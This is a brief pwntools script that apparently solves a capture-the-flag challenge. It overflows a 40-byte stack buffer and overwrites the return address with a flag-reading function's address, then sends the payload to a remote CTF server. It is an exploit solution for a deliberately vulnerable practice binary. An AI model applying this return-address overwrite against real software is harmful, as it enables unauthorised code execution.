from pwn import *

context.binary = elf = ELF("./ret2generic-flag-reader")

offset = 40
payload = b'a' * offset
payload += p64(elf.symbols.super_generic_flag_reading_function_please_ret_to_me)

#s = process('./ret2generic-flag-reader')
s = remote('mc.ax', 31077)
s.sendline(payload)
s.recvuntil('what do you think?\n')
print(s.recvline())
